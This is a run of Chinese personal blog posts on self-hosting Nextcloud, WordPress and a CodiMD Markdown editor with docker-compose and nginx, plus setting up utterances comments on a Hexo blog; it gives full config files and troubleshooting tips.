docker-compose部分借鉴了一位素不相识的名为chensmallx大佬的博客，稍微修改了一部分，解决了数据库的相关BUG 要实现https访问的话需要提前准备域名和证书 项目的目录结构如下： 12345678├── docker-compose.yml└── proxy ├── conf.d │ └── nextcloud.conf └── ssl_certs ├── cert.cer ├── cert.key └── fullchain.cer 没有域名和证书的朋友可以翻到这里 搭建方法 将项目克隆到本地，把自己的SSL证书放入proxy/ssl_certs目录下 修改proxy/conf.d/nextcloud.conf文件，将域名换成自己的 docker-compose up -d等待容器启动 各模块功能 FPM：fastCgi做为呈现层，提高处理速度 nginx：前置反向代理，提高并发处理能力，同时提供https服务 mariadb：中大型关系数据库，替换轻型的SQLite，提高数据读写性能和可靠性 redis：缓存数据库，提供数据缓存能力和文件锁管理器 依赖关系 nextcloud是主业务，读写数据时会用到数据库mariadb和缓存redis，因此nextcloud依赖于mariadb和redis mariadb和redis各司其职，挂了一个不会影响到另一个，故没有依赖关系 nginx作为反向代理，需要主体业务nextcloud正常运行才能提供代理服务，故nginx依赖于nextcloud 整体依赖关系如下： 12345678# 依赖关系如下 /-&gt; mariadbnginx -&gt; nextcloud -| \\-&gt; redisredis &amp; mariadb -&gt; nextcloud -&gt; nginx# 启动顺序则需要反过来 代码说明环境变量在老版本的docker-compose文件中，常见的环境变量可以直接用environment的变量表示，类似于chensmallx这种写法： 123456environment: # environment可以对容器创建指定多个环境变量 - MYSQL_ROOT_PASSWORD=root_password # 这里配置root密码 - MYSQL_DATABASE=nextcloud - MYSQL_USER=user_name # 这里配置一个非root账户给nextcloud使用 - MYSQL_PASSWORD=user_password # 这里配置上面那个账号的密码 然而，新版本的docker-compose和部分特定镜像可能会读不到此时的环境变量，就会导致数据库容器在创建时没有设置密码，同时也无法知道root密码是什么，最终可能导致服务启动失败。 在查阅了多方issue之后，我把environment改成了键值对的形式： 12345environment: MYSQL_ROOT_PASSWORD: set_your_password MYSQL_DATABASE: nextcloud MYSQL_USER: set_your_username MYSQL_PASSWORD: set_your_pass 数据库启动在搭建过程中遇到了innodb-read-only相关的BUG导致服务启动了但是无法安装，因此在启动服务时，我们直接利用command把innodb-read-only干掉，并解除内存限制： 12command: [--transaction-isolation=READ-COMMITTED,--binlog-format=ROW,--innodb-file-per-table=1,--skip-innodb-read-only-compressed]# to avoid innodb bugs 完整的docker-composedocker-compose.yml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859version: &#x27;3.4&#x27;services: db: image: mariadb restart: unless-stopped expose: - &quot;3306&quot; volumes: - ./db:/var/lib/mysql environment: MYSQL_ROOT_PASSWORD: set_your_password MYSQL_DATABASE: nextcloud MYSQL_USER: set_your_username MYSQL_PASSWORD: set_your_pass command: [--transaction-isolation=READ-COMMITTED,--binlog-format=ROW,--innodb-file-per-table=1,--skip-innodb-read-only-compressed] # to avoid innodb bugs cache: image: redis restart: unless-stopped expose: - &quot;6379&quot; volumes: - ./cache:/data command: redis-server --requirepass &#x27;redis_password&#x27; app: image: nextcloud:fpm restart: unless-stopped expose: - &quot;9000&quot; volumes: - ./app/html:/var/www/html - ./app/data:/var/www/html/data - ./app/config:/var/www/html/config - ./app/custom_apps:/var/www/html/custom_apps links: - db:db - cache:cache depends_on: - db - cache proxy: image: nginx restart: unless-stopped expose: - &quot;80&quot; ports: - 5000:443 volumes: - ./app/html:/var/www/html - ./proxy/conf.d:/etc/nginx/conf.d:ro - ./proxy/ssl_certs:/etc/nginx/ssl_certs:ro links: - app:app depends_on: - app 完整的nextcloud.conf123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148upstream php-handler &#123; server app:9000;&#125;server &#123; listen 80; listen [::]:80; server_name your.domain.com; # input your domain here # enforce https return 301 https://$server_name:443$request_uri;&#125;server &#123; listen 443 ssl http2; listen [::]:443 ssl http2; server_name your.domain.com; # Use Mozilla&#x27;s guidelines for SSL/TLS settings # https://mozilla.github.io/server-side-tls/ssl-config-generator/ # NOTE: some settings below might be redundant ssl_certificate /etc/nginx/ssl_certs/cert.cer; ssl_certificate_key /etc/nginx/ssl_certs/cert.key; # Add headers to serve security related headers # Before enabling Strict-Transport-Security headers please read into this # topic first. #add_header Strict-Transport-Security &quot;max-age=15768000; includeSubDomains; preload;&quot;; # # WARNING: Only add the preload option once you read about # the consequences in https://hstspreload.org/. This option # will add the domain to a hardcoded list that is shipped # in all major browsers and getting removed from this list # could take several months. add_header X-Content-Type-Options nosniff; add_header X-XSS-Protection &quot;1; mode=block&quot;; add_header X-Robots-Tag none; add_header X-Download-Options noopen; add_header X-Permitted-Cross-Domain-Policies none; add_header Referrer-Policy no-referrer; add_header Strict-Transport-Security 15552000; #add_header X-Frame-Options SAMEORIGIN; # Remove X-Powered-By, which is an information leak fastcgi_hide_header X-Powered-By; # Path to the root of your installation root /var/www/html; # The following 2 rules are only needed for the user_webfinger app. # Uncomment it if you&#x27;re planning to use this app. #rewrite ^/.well-known/host-meta /public.php?service=host-meta last; #rewrite ^/.well-known/host-meta.json /public.php?service=host-meta-json last; # The following rule is only needed for the Social app. # Uncomment it if you&#x27;re planning to use this app. #rewrite ^/.well-known/webfinger /public.php?service=webfinger last; location = /.well-known/carddav &#123; return 301 $scheme://$host:$server_port/remote.php/dav; &#125; location = /.well-known/caldav &#123; return 301 $scheme://$host:$server_port/remote.php/dav; &#125; # set max upload size client_max_body_size 512M; fastcgi_buffers 64 4K; # Enable gzip but do not remove ETag headers gzip on; gzip_vary on; gzip_comp_level 4; gzip_min_length 256; gzip_proxied expired no-cache no-store private no_last_modified no_etag auth; gzip_types application/atom+xml application/javascript application/json application/ld+json application/manifest+json application/rss+xml application/vnd.geo+json application/vnd.ms-fontobject application/x-font-ttf application/x-web-app-manifest+json application/xhtml+xml application/xml font/opentype image/bmp image/svg+xml image/x-icon text/cache-manifest text/css text/plain text/vcard text/vnd.rim.location.xloc text/vtt text/x-component text/x-cross-domain-policy; # Uncomment if your server is build with the ngx_pagespeed module # This module is currently not supported. #pagespeed off; location / &#123; rewrite ^ /index.php$request_uri; &#125; location ~ ^\\/(?:build|tests|config|lib|3rdparty|templates|data)\\/ &#123; deny all; &#125; location ~ ^\\/(?:\\.|autotest|occ|issue|indie|db_|console) &#123; deny all; &#125; location ~ ^\\/(?:index|remote|public|cron|core\\/ajax\\/update|status|ocs\\/v[12]|updater\\/.+|oc[ms]-provider\\/.+)\\.php(?:$|\\/) &#123; fastcgi_split_path_info ^(.+?\\.php)(\\/.*|)$; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param HTTPS on; # Avoid sending the security headers twice fastcgi_param modHeadersAvailable true; # Enable pretty urls fastcgi_param front_controller_active true; fastcgi_pass php-handler; fastcgi_intercept_errors on; fastcgi_request_buffering off; &#125; location ~ ^\\/(?:updater|oc[ms]-provider)(?:$|\\/) &#123; try_files $uri/ =404; index index.php; &#125; # Adding the cache control header for js, css and map files # Make sure it is BELOW the PHP block location ~ \\.(?:css|js|woff2?|svg|gif|map)$ &#123; try_files $uri /index.php$request_uri; add_header Cache-Control &quot;public, max-age=15778463&quot;; # Add headers to serve security related headers (It is intended to # have those duplicated to the ones above) # Before enabling Strict-Transport-Security headers please read into # this topic first. #add_header Strict-Transport-Security &quot;max-age=15768000; includeSubDomains; preload;&quot;; # # WARNING: Only add the preload option once you read about # the consequences in https://hstspreload.org/. This option # will add the domain to a hardcoded list that is shipped # in all major browsers and getting removed from this list # could take several months. add_header X-Content-Type-Options nosniff; add_header X-XSS-Protection &quot;1; mode=block&quot;; add_header X-Robots-Tag none; add_header X-Download-Options noopen; add_header X-Permitted-Cross-Domain-Policies none; add_header Referrer-Policy no-referrer; # Optional: Don&#x27;t log access to assets access_log off; &#125; location ~ \\.(?:png|html|ttf|ico|jpg|jpeg|bcmap)$ &#123; try_files $uri /index.php$request_uri; # Optional: Don&#x27;t log access to other assets access_log off; &#125;&#125; 故障排除先确保容器正常运行：docker-compose ps查看容器状态：都是Up说明运行成功 Nginx一直重启证书设置如果出现proxy一直在重启的情况，可以查看一下日志docker-compose logs：大部分时候应该是没放证书或者证书设置错误…… 比如这个就是典型的忘记设置证书了：重新配置证书即可 关闭https如果没有证书的话，把nextcloud.conf设置成http的即可： 把443那一段直接复制粘贴到80上；同时修改docker-compose.yml的端口映射： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123## nextcloud.confupstream php-handler &#123; server app:9000;&#125;server &#123; listen 80; listen [::]:80; add_header X-Content-Type-Options nosniff; add_header X-XSS-Protection &quot;1; mode=block&quot;; add_header X-Robots-Tag none; add_header X-Download-Options noopen; add_header X-Permitted-Cross-Domain-Policies none; add_header Referrer-Policy no-referrer; add_header Strict-Transport-Security 15552000; #add_header X-Frame-Options SAMEORIGIN; # Remove X-Powered-By, which is an information leak fastcgi_hide_header X-Powered-By; # Path to the root of your installation root /var/www/html; # The following 2 rules are only needed for the user_webfinger app. # Uncomment it if you&#x27;re planning to use this app. #rewrite ^/.well-known/host-meta /public.php?service=host-meta last; #rewrite ^/.well-known/host-meta.json /public.php?service=host-meta-json last; # The following rule is only needed for the Social app. # Uncomment it if you&#x27;re planning to use this app. #rewrite ^/.well-known/webfinger /public.php?service=webfinger last; location = /.well-known/carddav &#123; return 301 $scheme://$host:$server_port/remote.php/dav; &#125; location = /.well-known/caldav &#123; return 301 $scheme://$host:$server_port/remote.php/dav; &#125; # set max upload size client_max_body_size 512M; fastcgi_buffers 64 4K; # Enable gzip but do not remove ETag headers gzip on; gzip_vary on; gzip_comp_level 4; gzip_min_length 256; gzip_proxied expired no-cache no-store private no_last_modified no_etag auth; gzip_types application/atom+xml application/javascript application/json application/ld+json application/manifest+json application/rss+xml application/vnd.geo+json application/vnd.ms-fontobject application/x-font-ttf application/x-web-app-manifest+json application/xhtml+xml application/xml font/opentype image/bmp image/svg+xml image/x-icon text/cache-manifest text/css text/plain text/vcard text/vnd.rim.location.xloc text/vtt text/x-component text/x-cross-domain-policy; # Uncomment if your server is build with the ngx_pagespeed module # This module is currently not supported. #pagespeed off; location / &#123; rewrite ^ /index.php$request_uri; &#125; location ~ ^\\/(?:build|tests|config|lib|3rdparty|templates|data)\\/ &#123; deny all; &#125; location ~ ^\\/(?:\\.|autotest|occ|issue|indie|db_|console) &#123; deny all; &#125; location ~ ^\\/(?:index|remote|public|cron|core\\/ajax\\/update|status|ocs\\/v[12]|updater\\/.+|oc[ms]-provider\\/.+)\\.php(?:$|\\/) &#123; fastcgi_split_path_info ^(.+?\\.php)(\\/.*|)$; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param HTTPS on; # Avoid sending the security headers twice fastcgi_param modHeadersAvailable true; # Enable pretty urls fastcgi_param front_controller_active true; fastcgi_pass php-handler; fastcgi_intercept_errors on; fastcgi_request_buffering off; &#125; location ~ ^\\/(?:updater|oc[ms]-provider)(?:$|\\/) &#123; try_files $uri/ =404; index index.php; &#125; # Adding the cache control header for js, css and map files # Make sure it is BELOW the PHP block location ~ \\.(?:css|js|woff2?|svg|gif|map)$ &#123; try_files $uri /index.php$request_uri; add_header Cache-Control &quot;public, max-age=15778463&quot;; # Add headers to serve security related headers (It is intended to # have those duplicated to the ones above) # Before enabling Strict-Transport-Security headers please read into # this topic first. #add_header Strict-Transport-Security &quot;max-age=15768000; includeSubDomains; preload;&quot;; # # WARNING: Only add the preload option once you read about # the consequences in https://hstspreload.org/. This option # will add the domain to a hardcoded list that is shipped # in all major browsers and getting removed from this list # could take several months. add_header X-Content-Type-Options nosniff; add_header X-XSS-Protection &quot;1; mode=block&quot;; add_header X-Robots-Tag none; add_header X-Download-Options noopen; add_header X-Permitted-Cross-Domain-Policies none; add_header Referrer-Policy no-referrer; # Optional: Don&#x27;t log access to assets access_log off; &#125; location ~ \\.(?:png|html|ttf|ico|jpg|jpeg|bcmap)$ &#123; try_files $uri /index.php$request_uri; # Optional: Don&#x27;t log access to other assets access_log off; &#125;&#125; 12345678910111213141516## docker-compose的proxy模块：把443改成80proxy: image: nginx restart: unless-stopped expose: - &quot;80&quot; ports: - 5000:80 volumes: - ./app/html:/var/www/html - ./proxy/conf.d:/etc/nginx/conf.d:ro - ./proxy/ssl_certs:/etc/nginx/ssl_certs:ro links: - app:app depends_on: - app 重新构建容器： 12345docker-compose down# 关闭并删除原有容器docker-compose up -d# 构建新容器 此时我就部署了一个http服务的nextcloud： SQLSTATE[HY000] [2002] No such file or directory注册时出现数据库找不到localhost的情况： 问题原因： 因为我们用的数据库的是容器，所以不能直接用主机的localhost或者localhost:3306去寻找主机。 解决方案： 因该通过容器的DNS服务寻找，比如在我们项目中，就应该输入db:3306 您的数据目录可被其他用户读取 问题原因：这里用的是WSL做演示。WSL用的是Windows的NTFS文件系统，权限是由Windows控制的，故所有目录都是0770…… 解决方案：别用WSL……整一个纯正的Linux系统就行。 其他数据库问题 innodb相关的问题前面提到了，参考项目中docker-compose.yml重新设置即可。 环境变量的问题前面也提到了，改成键值对的形式即可。 如果是直接克隆下来的项目，应该不会有这俩问题 最终效果最后安装完毕大概长这样啦：这个是没怎么设置的原始UI 小结容器操作不难，编排也不难，难的是写出了配置文件然后疯狂debug…… Refference https://hexo.chensmallx.top/2021/04/08/nextcloud-on-docker/","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"},{"name":"nextcloud","slug":"nextcloud","permalink":"https://blog.xiabee.cn/tags/nextcloud/"}]},{"title":"Docker搭建Wordpress个人博客","slug":"coding/docker搭建Wordpress","date":"2021-11-09T12:00:23.000Z","updated":"2022-08-13T15:39:31.418Z","comments":true,"path":"posts/wordpress-docker/","link":"","permalink":"https://blog.xiabee.cn/posts/wordpress-docker/","excerpt":"","text":"Wordpress简介 官网 适合新手入门的博客框架，常用于个人博客的搭建，正如其名字一样，通过简单的几个word即可搭建出一个博客 太长不看版 项目地址：Github 功能：通过docker-compose，实现了利用容器搭建nginx+mariadb+wordpress的组合，在VPS中搭建个人博客 运行方式：详情见项目的README.md 环境依赖：docker 123sudo apt install docker docker-composegit clone https://github.com/xiabee/wordpress-dockercd wordpress-docker 搭建HTTP服务1234rm ./nginx/nginx_https.conf# 删除httpsdocker-compose up -d# 构建http服务 搭建HTTPS服务如果要搭建https服务的话需要在nginx_https.conf中配置一下证书路径，并删除nginx.conf，重新构建服务。 12rm ./nginx/nginx.confdocker-compose up -d 代码详解docker-compose.yml 官方文档 简言之：调用Docker服务的API进行容器管理，定义和运行多个Docker容器应用。 network模块这里直接跳过，就是定义一下网络类型和网络ID，这里不需要过多设置，我们直接跳到服务services模块 wordpress模块12345678910111213141516171819wordpress: # 选中带有php-fpm 的版本 image: wordpress:5.8.1-php8.0-fpm # 把wordpress的主体文件夹映射到本地 wordpress目录 volumes: - ./wordpress:/var/www/html # 环境变量 设置密码 environment: WORDPRESS_DB_HOST: mariadb:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress-pass WORDPRESS_DB_NAME: wordpress # 设置依赖 depends_on: - mariadb restart: always networks: - xiabee image：这里选择带有FPM的wordpress镜像，因为要配合nginx使用 volumes：建立目录映射，将容器目录映射到宿主机中，方便我们管理和维护容器的文件 environment：设置环境变量，用于设置数据库的密码 depends_on：设置依赖，这里wordpress需要依赖mariadb数据库启动 restart：设置重启方式，这里选择always，即挂掉就重启。 networks：这里直接用了前面定义的网络 mariadb1234567891011121314151617181920mariadb: image: mariadb:latest expose: - &quot;3306&quot; volumes: - ./mysql:/var/lib/mysql environment: MYSQL_ROOT_PASSWORD: root-pass MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress-pass MYSQL_RANDOM_ROOT_PASSWORD: 1 # 使用随机root密码 #这里使用命令登陆，删除后可能于新版mysql不兼容 command: [--default-authentication-plugin=mysql_native_password, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci] #挂掉自动重启 restart: always networks: - xiabee command：使用命令方式登录，进行设置，避免BUG 其他与wordpress的操作基本相同 nginx1234567891011121314151617nginx: image: nginx:latest ports: - &#x27;80:80&#x27; - &#x27;443:443&#x27; # 映射本地，加载本地的配置 volumes: - ./nginx:/etc/nginx/conf.d #注意服务器配置文件的映射位置，如果需要修改配置，直接修改映射的文件即可 - ./logs/nginx:/var/log/nginx - ./wordpress:/var/www/html #这里选择本地wordpress即 wordpress。docker中的目录 depends_on: - wordpress restart: always networks: - xiabee 这里注意目录映射的位置就行，其他和wordpress的设置基本相同 nginx.conf 这个文件用来配置http服务 开启http服务时需要删除nginx_https.conf 123456789101112131415161718192021222324server &#123;listen 80; #设置监听端口，http默认端口为80server_name localhost; root /var/www/html; index index.php; access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; location / &#123; try_files $uri $uri/ /index.php?$args; &#125; location ~ \\.php$ &#123; try_files $uri =404; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass wordpress:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_path_info; &#125;&#125; listen：监听端口 server_name：设置你的域名 root：根目录地址 location：设置访问的url，这里设置的是根目录的访问，即访问网站根目录时，跳转到/index.php上 第二个location用于监听9000端口的wordpress，对wordpress进行反向代理 nginx_https.conf 这个文件用于构建https服务 开启https需要提前拥有域名和证书 开启https服务时需要删除nginx.conf 禁止IP直接访问12345server &#123; listen 80 default; server_name ~.*; return 500;&#125; #禁止直接ip访问 这里创建一个server用于禁止IP直接访问 强制HTTPS12345server &#123; listen 80; server_name domain name.com; #这里的domain name.com换成您的域名 return 301 https://$server_name$request_uri;&#125; #强制全站使用https 这里的server用于强制全站使用https 设置证书文件12345678910111213141516171819202122232425262728293031323334353637server &#123; listen 443 ssl; server_name domain name.com; #这里的domain name.com换成您的域名 root /var/www/html; index index.php; ssl_certificate ./conf.d/domain name.com; #将domain name.pem替换成您的证书文件 ssl_certificate_key ./conf.d/domain name.key; #将domain name.key替换成您的密钥文件 ssl_session_timeout 5m; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; #使用此加密套件。 ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #使用该协议进行配置。 ssl_prefer_server_ciphers on; access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; location / &#123; try_files $uri $uri/ /index.php?$args; &#125; location ~ \\.php$ &#123; try_files $uri =404; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass wordpress:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_path_info; &#125;&#125; #https服务器 这里需要把自己的证书添加到宿主机的nginx目录下，因为前面做了目录映射，所以证书会自动映射到容器的conf.d目录中 常见BUG/docker/api/client.py错误 容器服务没开……开启容器服务，重新运行 数据库错误 在docker-compose升级之后，environment的设置必须像仓库中那样以键值对的形式存在，不能直接输入一个字符串，否则会读不到环境变量，导致数据库密码设置错误，最终导致连不上服务器 如果你是直接CV这个项目的话应该不会有问题，除非你数据库密码填错了（x） nginx一直重启 检查一下是不是配置了https但是证书没有复制到目录内…… 如果不想设置https，那就直接把nginx_https.conf删掉，重启容器就行 最终安装如果所有容器都正常启动了，直接访问你的IP/域名应该就能看到安装界面了（https服务如果没有做强制跳转，则需访问你域名的443端口才能访问） 安装完成之后，剩下的事情对着说明做就行了，如果实在看不懂就装个中文版的…… 关于主题 xiabee.cn用的是樱花庄主题：个人感觉还算好看，就是不够简洁，所以转战hexo了哈哈哈（x） 不过之后可能会再找几个好看的主题","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"},{"name":"wordpress","slug":"wordpress","permalink":"https://blog.xiabee.cn/tags/wordpress/"}]},{"title":"Docker搭建Markdown共享编辑器","slug":"coding/docker搭建共享markdown","date":"2021-11-07T12:00:23.000Z","updated":"2022-08-13T15:39:31.420Z","comments":true,"path":"posts/markdown-docker/","link":"","permalink":"https://blog.xiabee.cn/posts/markdown-docker/","excerpt":"","text":"服务地址 https://xiabee.cn:3000 前情提要 腾讯云双十一特惠，一次买了个8M带宽、2核4G的云服务器……不拿它整点活可惜了 目前的想法是搞个markdown共享编辑器、个人网盘啥的 搭建动机主流的共享编辑器有很多，这里安利一个我个人比较喜欢的：Hackmd的Codimd 上述的链接需要翻墙，非常不方便，所以我想在自己的服务器里面也造一个…… 前期准备 一个VPS 一个SSL证书（可选） VPS中安装了docker、docker-compose等服务 12345sudo apt install dockersudo apt install docker.iosudo apt install docker-composesudo service docker start# 下载、启动docker等 部署方式 官方推荐通过容器部署，这里也是介绍容器部署方式，同时添加nginx代理 其他部署方式可以参考官方文档 编写yml文件创建一个空目录，在该目录中创建docker-compose.yml。 内容直接利用官方的： 1234567891011121314151617181920212223242526version: &quot;3&quot;services: database: image: postgres:11.6-alpine environment: - POSTGRES_USER=codimd - POSTGRES_PASSWORD=change_password - POSTGRES_DB=codimd volumes: - &quot;database-data:/var/lib/postgresql/data&quot; restart: always codimd: image: hackmdio/hackmd:2.4.1 environment: - CMD_DB_URL=postgres://codimd:change_password@database/codimd - CMD_USECDN=false depends_on: - database ports: - &quot;3000:3000&quot; volumes: - upload-data:/home/hackmd/app/public/uploads restart: alwaysvolumes: database-data: &#123;&#125; upload-data: &#123;&#125; 此时通过docker-compose up -d启动容器，这个服务默认端口是3000。在浏览器输入你的域名和端口http://xxxx.xxx.xxx:3000就能看到这个编辑器了。 如果看不到的话记得检查一下云服务器厂商的防火墙关没关…… 当然，这个是最基础的版本，我们可以继续优化一下。 添加Nginx代理目录结构： 12345.├── docker-compose.yml└── proxy └── conf.d └── hackmd.conf 在docker-compose.yml中添加关于nginx相关内容，大致内容如下： 12345678910111213141516171819202122232425262728293031323334353637383940version: &quot;3&quot;services: database: image: postgres:11.6-alpine environment: - POSTGRES_USER=codimd - POSTGRES_PASSWORD=change_password - POSTGRES_DB=codimd volumes: - &quot;database-data:/var/lib/postgresql/data&quot; restart: always codimd: image: hackmdio/hackmd:latest environment: - CMD_DB_URL=postgres://codimd:change_password@database/codimd - CMD_USECDN=false depends_on: - database volumes: - upload-data:/home/hackmd/app/public/uploads restart: always proxy: image: nginx restart: unless-stopped expose: - &quot;80&quot; ports: - 3000:80 # 修改端口 volumes: - ./proxy/conf.d:/etc/nginx/conf.d:ro links: - codimd:codimd depends_on: - codimdvolumes: database-data: &#123;&#125; upload-data: &#123;&#125; 同时配置hackmd.conf，作为nginx的配置文件，大致内容如下： 1234567891011121314151617181920212223242526272829upstream @codimd &#123; server codimd:3000; keepalive 300;&#125;# for socket.io (http upgrade)map $http_upgrade $connection_upgrade &#123; default upgrade; &#x27;&#x27; close;&#125;server &#123; listen 80; server_name xxx.xxx.xx; location / &#123; # set header for proxy protocol proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $connection_upgrade; proxy_read_timeout 300; proxy_connect_timeout 300; proxy_pass http://@codimd; &#125;&#125; 然后再重新部署容器： 12345docker-compose down# 删除上一个服务docker-compose up -d# 启动容器 此时我们的nginx代理已经开始运行了： 启用SSL（可选）参考官方文档。 注册SSL证书，并将目录放置到proxy目录中：123456789.├── docker-compose.yml└── proxy ├── conf.d │ └── hackmd.conf └── ssl_certs ├── cert.cer ├── cert.key └── fullchain.cer 修改docker-compose.yml：1234567891011121314151617181920212223242526272829303132333435363738394041version: &quot;3&quot;services: database: image: postgres:11.6-alpine environment: - POSTGRES_USER=codimd - POSTGRES_PASSWORD=change_password - POSTGRES_DB=codimd volumes: - &quot;database-data:/var/lib/postgresql/data&quot; restart: always codimd: image: hackmdio/hackmd:latest environment: - CMD_DB_URL=postgres://codimd:change_password@database/codimd - CMD_USECDN=false depends_on: - database volumes: - upload-data:/home/hackmd/app/public/uploads restart: always proxy: image: nginx restart: unless-stopped expose: - &quot;80&quot; ports: - 3000:443 # 修改端口 volumes: - ./proxy/conf.d:/etc/nginx/conf.d:ro - ./proxy/ssl_certs:/etc/nginx/ssl_certs:ro links: - codimd:codimd depends_on: - codimdvolumes: database-data: &#123;&#125; upload-data: &#123;&#125; 修改hackmd.conf把域名和证书设置为自己的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# setup a upstream point to CodiMD serverupstream @codimd &#123; server codimd:3000; keepalive 300;&#125;# for socket.io (http upgrade)map $http_upgrade $connection_upgrade &#123; default upgrade; &#x27;&#x27; close;&#125;server &#123; listen 80; listen [::]:80; server_name your.domain.name; # enforce https return 301 https://$server_name:443$request_uri;&#125;server &#123; listen 443 ssl http2; listen [::]:443 ssl http2; server_name your.domain.name; ssl_certificate /etc/nginx/ssl_certs/cert.cer; ssl_certificate_key /etc/nginx/ssl_certs/cert.key; location / &#123; proxy_http_version 1.1; # set header for proxy protocol proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $connection_upgrade; # setup for image upload client_max_body_size 8192m; # adjust proxy buffer setting proxy_buffers 8 32k; proxy_buffer_size 32k; proxy_busy_buffers_size 64k; proxy_max_temp_file_size 8192m; proxy_read_timeout 300; proxy_connect_timeout 300; proxy_pass http://@codimd; &#125;&#125; 然后重新构造容器： 12345678docker-compose down# 删除上一个服务docker-compose up -d# 部署容器docker-compose restart# 重启容器 此时已经可以https访问了： 一些BUG证书相关如果http能访问，但是https不能访问，可以检查一下证书路径是否设置正确、nginx监听端口是否正确等。多看docker-compose logs，看看具体报错 123docker-compose logsdocker-compose logs --tail 10docker-compose logs --tail 10 | grep proxy 代理相关检查一下nginx的配置文件有没有写错…… 之前我本人写的xxx.conf就有bug，一直登录不上 主页能访问，但是无法登陆再次检查一下nginx的配置文件有没有写错…… 如果完全不会写，可以直接抄这篇博客里面的，修改一个个人信息配置就行。","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://blog.xiabee.cn/tags/docker/"},{"name":"markdown","slug":"markdown","permalink":"https://blog.xiabee.cn/tags/markdown/"}]},{"title":"utteranc 搭建评论系统","slug":"coding/utteranc.es搭建评论系统","date":"2021-11-03T14:46:18.000Z","updated":"2022-08-13T15:39:31.420Z","comments":true,"path":"posts/utteranc-hexo/","link":"","permalink":"https://blog.xiabee.cn/posts/utteranc-hexo/","excerpt":"","text":"简介 官网 利用github issue做静态博客的评论系统 关于Gitalkgitalk曾经（包括现在）也是很火的博客评论插件，但是它出现过安全事故:v2ex论坛， 黑客派骗star，就不推荐使用。 这里给不能科学上网的同学简述一下：这个项目要的权限太多了，最坏情况下，恶意的使用者可以直接修改你的项目……黑客派就曾利用你登录评论区的token，偷偷的给自己仓库标star…… 关于utteranc 仅用于登录Github，如果网页内已经登录了Github则无需重复授权 只对相关issue有读写权限，没有整个仓库读写权限，不存在直接利用token修改仓库的情况 搭建手动搭建官网写的很详细了，我简述一下（x） 创建一个仓库 给仓库安装 utterances APP 配置一下读写权限 插入代码中： 1234567&lt;script src=&quot;https://utteranc.es/client.js&quot; repo=&quot;[ENTER REPO HERE]&quot; issue-term=&quot;pathname&quot; theme=&quot;github-light&quot; crossorigin=&quot;anonymous&quot; async&gt;&lt;/script&gt; Archer主题集成 创建仓库和安装APP和手动搭建相同 找到主题目录的_config.yml中的comment字段： 12345comment: utteranc_repo: &quot;[ENTER REPO HERE]&quot; # 这里填你的repo utteranc_label: &quot;Comment&quot; utteranc_theme: &quot;github-light&quot; utteranc_issue_term: &quot;title&quot; 允许/禁止comment在md文件首部YAML Front Matter部分添加comments字段，例如： 1234567title: utteranc 搭建评论系统date: 2021-11-3 22:46:18tags: - hexo - utteranccategories: - coding 测试评论测试发布评论： 邮件提醒： ISSUE： 修改提醒如果想修改邮件提醒可以在右上角Notifications里面改：","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.xiabee.cn/tags/hexo/"},{"name":"utteranc","slug":"utteranc","permalink":"https://blog.xiabee.cn/tags/utteranc/"}]},{"title":"Git Page + Coding Page 实现负载均衡","slug":"coding/GtiPage+Coding负载均衡","date":"2021-11-02T14:46:18.000Z","updated":"2022-08-13T15:39:31.407Z","comments":true,"path":"posts/git-coding-hexo/","link":"","permalink":"https://blog.xiabee.cn/posts/git-coding-hexo/","excerpt":"","text":"问题描述Github Page不能被搜索引擎收录Github Page禁止了百度爬虫，导致百度无法收录我的博客；然后其他搜索引擎可能也是类似原因，均无法收录。而且曾经可以通过手动上传和sitemap的方式提交链接，现在连sitemap都读不到了……被迫转战其他平台：使用自定义域名 Github Page在国内访问速度较慢github.io经常抽风，在国内访问不稳定，考虑增加一个国内的备份。 初步解决方案 利用coding创建国内镜像 